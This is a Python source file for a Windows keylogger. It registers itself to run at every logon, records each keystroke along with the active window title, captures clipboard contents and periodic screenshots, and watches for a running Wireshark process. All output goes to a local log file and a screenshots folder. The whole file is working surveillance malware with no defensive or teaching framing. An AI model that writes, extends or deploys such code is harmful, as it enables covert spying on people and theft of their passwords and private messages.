import time
import sys
import os
import threading
from pynput import keyboard
import win32gui
import win32clipboard
import winreg
from PIL import ImageGrab
import psutil

log_file = "keylog.txt"
screenshot_dir = "screens"
current_word = []
backspace_count = 0
last_window = None

# --- Auto start on boot ---
def add_to_startup():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MyKeylogger", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

# --- Get active window title ---
def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

# --- Clipboard monitor ---
def clipboard_monitor():
    recent_value = ""
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data != recent_value:
                recent_value = data
                if len(data) < 1000 and "import" not in data:
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(f"\n[Clipboard] {time.ctime()} : {recent_value}\n")
        except:
            pass
        time.sleep(5)

# --- Screenshot capture ---
def take_screenshot():
    try:
        os.makedirs(screenshot_dir, exist_ok=True)
        img = ImageGrab.grab()
        filename = os.path.join(screenshot_dir, f"screenshot_{int(time.time())}.png")
        img.save(filename)
        return filename
    except:
        return None

# --- Periodic screenshot thread ---
def periodic_screenshot():
    while True:
        filename = take_screenshot()
        if filename:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\n📸 Screenshot Saved: {filename.replace(os.sep, '/')}\n")
        time.sleep(60)

# --- Wireshark process monitor ---
def wireshark_monitor():
    already_logged = False
    while True:
        found = False
        for proc in psutil.process_iter(['name']):
            try:
                if 'wireshark' in proc.info['name'].lower():
                    found = True
                    if not already_logged:
                        with open(log_file, "a", encoding="utf-8") as f:
                            f.write(f"\n[Wireshark process detected at {time.ctime()}]\n")
                        already_logged = True
            except:
                pass
        if not found:
            already_logged = False
        time.sleep(5)

# --- Write header when window changes ---
def write_header(window_title):
    timestamp = time.strftime("%a %b %d %H:%M:%S %Y")
    screenshot_path = take_screenshot()
    header = f"\n🕒 Timestamp: {timestamp}\n📌 Active Window: {window_title}\n"
    if screenshot_path:
        header += f"📸 Screenshot Saved: {screenshot_path.replace(os.sep, '/')}\n"
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(header)

# --- Append a word or backspace count without header ---
def flush_word_log():
    global current_word, backspace_count
    with open(log_file, "a", encoding="utf-8") as f:
        if current_word:
            f.write(f"⌨️ Keystrokes: {''.join(current_word)} ")
            current_word = []
        if backspace_count > 0:
            f.write(f"[Backspace] x{backspace_count} ")
            backspace_count = 0
        f.write("\n---------------------------------------------------\n")

# --- Keylogger listener ---
def on_press(key):
    global current_word, backspace_count, last_window
    try:
        active_window = get_active_window_title()

        # If active window changed, flush previous word and write new header
        if last_window != active_window:
            # Flush leftover word from previous window
            if current_word or backspace_count > 0:
                flush_word_log()
            write_header(active_window)
            last_window = active_window

        if hasattr(key, 'char') and key.char is not None:
            current_word.append(key.char)
        elif key == keyboard.Key.space:
            flush_word_log()
        elif key == keyboard.Key.enter:
            flush_word_log()
            with open(log_file, "a", encoding="utf-8") as f:
                f.write("[Enter]\n---------------------------------------------------\n")
        elif key == keyboard.Key.backspace:
            if current_word:
                current_word.pop()
            else:
                backspace_count += 1
    except Exception as e:
        pass

# --- Main ---
def main():
    add_to_startup()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=periodic_screenshot, daemon=True).start()
    threading.Thread(target=wireshark_monitor, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
